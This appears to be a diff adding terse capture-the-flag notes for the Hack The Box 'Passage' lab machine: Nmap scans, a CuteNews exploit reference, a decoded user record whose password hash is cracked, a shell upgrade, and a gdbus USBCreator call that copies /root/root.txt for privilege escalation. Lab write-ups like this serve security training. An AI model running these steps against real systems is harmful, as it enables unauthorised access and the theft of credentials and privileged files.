@@ -1,0 +1,61 @@
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-06 20:46 EDT
+Nmap scan report for passage.htb (10.10.10.206)
+Host is up (0.057s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
+|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
+|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Passage News
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.47 seconds
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-06 20:46 EDT
+Nmap scan report for passage.htb (10.10.10.206)
+Host is up (0.057s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
+|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
+|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Passage News
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 44.75 seconds
+
+################################################################################
+FOOTHOLD
+################################################################################
+O-http://passage.htb/CuteNews/
+  O-Powered by CuteNews 2.1.2 © 2002–2020 CutePHP.
+    O-https://www.exploit-db.com/exploits/46698
+      O-broken module... need to search for 'Referen' and add a comma
+        O-curl localhost:631/
+          O-CUPS 2.1.3
+curl localhost:631/admin/?ADVANCEDSETTINGS=YES
+cat /var/www/html/CuteNews/cdata/users/b0.php | base64 -d
+  a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
+    e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
+    https://sha256.j4ck.com/11189
+      -atlanta1
+python -c 'import pty; pty.spawn("/bin/bash")'
+su paul
+
+################################################################################
+ROOT
+################################################################################
+O-looking at .ssh, it seems that paul can just ssh as nadav
+O-nadav's .viminfo has hints to native dbus:
+  O-https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
+    O-nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /home/nadav/.ku.txt true
+
